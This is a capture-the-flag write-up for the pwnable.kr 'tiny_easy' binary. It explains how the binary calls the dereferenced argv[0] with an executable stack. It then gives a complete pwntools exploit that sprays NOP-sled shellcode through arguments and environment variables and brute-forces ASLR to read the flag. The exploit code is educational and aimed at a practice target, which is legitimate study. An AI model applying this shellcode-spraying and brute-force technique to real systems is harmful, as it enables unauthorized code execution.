This challenge is quite tiny, we are dealing with a 32-bit ELF binary that is literally 90 bytes,
only 6 of which account for code with the rest constituting ELF and program headers.
Here are these important 6 bytes (extracted with Ghidra):

```
                      ************************************************
                      *                   FUNCTION                   *
                      ************************************************
                      undefined processEntry entry()
          undefined     AL:1              <RETURN>
                      entry                                 XREF[2]:  Entry Point(*),
                                                                      08048018(*)
   08048054 58         POP         EAX
   08048055 5a         POP         EDX
   08048056 8b 12      MOV         EDX, dword ptr [EDX]
   08048058 ff d2       CALL        EDX
```
The program pops two values from the stack and jumps to the dereferenced second one (stored in `edx`).
This might seem random, to get a better idea for what's happening let's debug the binary:

```
❯ gdb tiny_easy
(gdb) starti
Starting program: /home/martician/tiny_easy

Program stopped.
0x08048054 in ?? ()
(gdb) x/10x $esp
0xffffd5a0:	0x00000001	0xffffd782	0x00000000	0xffffd79c
0xffffd5b0:	0xffffd7ab	0xffffd7dc	0xffffd807	0xffffd841
0xffffd5c0:	0xffffd86b	0xffffd893
(gdb) x/s 0xffffd782
0xffffd782:	"/home/martician/tiny_easy"
(gdb) x/s 0xffffd79c
0xffffd79c:	"SHELL=/bin/zsh"
(gdb)
```
It looks like prior to the execution of the binary the OS sets the process image
so that arguments and environment variables together with pointers to them are stored on the stack.
We can observe that on the top of the stack we have `argc` which is the number of arguments
passed to the program, then we have the argument pointers and environment variable pointers arrays
`argv[]` and `envp[]` both terminated by `NULL` pointers.

The program pops `agrc` into `eax` (it basically discards it)
then pops `argv[0]` into `edx`, dereferences it (treating is as a 4-byte integer)
and jumps to it (via the `call` instruction).
This means that by manipulating `argv[0]` we could jump to (almost) any address in the binary.
Since the `tiny_easy` file is a static executable there aren't really many places of interest to us,
there is just the stack and fortunately it is executable (NX is disabled):
```
❯ checksec --file=tiny_easy
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          N/A        N/A          No Symbols	N/A	0		0		tiny_easy
```

From here the exploit looks clear:

- Encode shellcode in some of the arguments/environment variables.
- Set `argv[0]` to have the address of the shellcode.

There is one problem we need to concern ourselves with and that is ASLR.
Basically, since the address space is randomized, there is no fixed location for the stack.
However this security measure is relatively effective,
the stack still has to grow downwards so there is a limit for the range in which the OS puts it
(that's especially true for 32-bit binaries which don't have address space to spare).

By running the binary through a debugger we can observe that upon entry the top of the stack
lies in the address range `[0xff000000, 0xffffffff]` (this might even be a bit generous).
That's  a total of $2^{24}$ or around $17$ million addresses! Would we be able to bruteforce it?
Yes, by using a trick we can actually skip most of the addresses without missing our shellcode.
I have put more detailed comments in the code bellow to illustrate the idea:
```python
from pwn import *

# Silence info messages.
context.log_level = 'warning'
# Make the payload as long as possible (via nop sled)
# This will not only increases our chances of a hit but
# also allow us to make bigger jumps when bruteforcing the addresses.
payload = asm(shellcraft.nop() * (2**17 - 100) + shellcraft.cat('flag'))

# Contaminate the arguments and the environment as much as possible.
# This I pretty much got from https://alexsieusahai.github.io/Pwnable_kr-tiny-easy/
env = {str(i) : payload for i in range(10)}
argv = [b'junk'] + [payload] * 5

# bruteforce argv[0]
# As commented above we can make big jumps (i.e. 2**16 since the payload is bigger)
for i in range(0xff010101, 0xffffffff, 0x10000):
    argv[0] = p32(i)
    proc = process(argv=argv, executable='/home/tiny_easy/tiny_easy', env=env)
    rez = proc.recvall()
    if rez:
        print(rez)
```

Finally, if you are impatient you can go get some popcorn,
it takes about a minute or two to start hitting the correct addresses:

```
tiny_easy@pwnable:~$ python /tmp/ez/ez.py
...(flag)...

...(flag)...

...(flag)...

...
```
